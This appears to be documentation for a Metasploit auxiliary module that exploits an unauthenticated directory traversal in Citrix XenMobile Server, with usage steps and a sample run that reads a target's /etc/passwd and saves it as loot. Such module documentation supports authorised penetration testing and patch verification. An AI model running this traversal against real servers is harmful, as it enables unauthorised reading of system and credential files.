## Vulnerable Application

This module exploits an unauthenticated directory traversal vulnerability in Citrix XenMobile Server 10.12 before RP2, Citrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10 before RP6 and Citrix XenMobile Server before 10.9 RP5 which leads to the ability to read arbitrary files.

## Verification Steps

1. `./msfconsole`
2. `use auxiliary/scanner/http/citrix_xenmobile_directory_traversal`
3. `set rhosts <rhost>`
4. `set rport <rport>`
5. `set ssl <true/false>`
4. `run`

## Scenarios

```
msf6 auxiliary(scanner/http/citrix_xenmobile_directory_traversal) > options 

Module options (auxiliary/scanner/http/citrix_xenmobile_directory_traversal):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DEPTH     4                yes       Depth for Path Traversal
   FILEPATH  /etc/passwd      yes       The path to the file to read
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    [REDACTED]   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     8443             yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                yes       The number of concurrent threads (max one per host)
   VHOST                      no        HTTP server virtual host

msf6 auxiliary(scanner/http/citrix_xenmobile_directory_traversal) > run

[+] [REDACTED]:8443 - root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/dev/null:/bin/false
.....

[+] File saved in: /Users/Dhiraj/.msf4/loot/20201116215810_default_[REDACTED]_xenmobile.traver_784657.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/citrix_xenmobile_directory_traversal) > 
msf6 auxiliary(scanner/http/citrix_xenmobile_directory_traversal) >
```

**Reference:** https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/
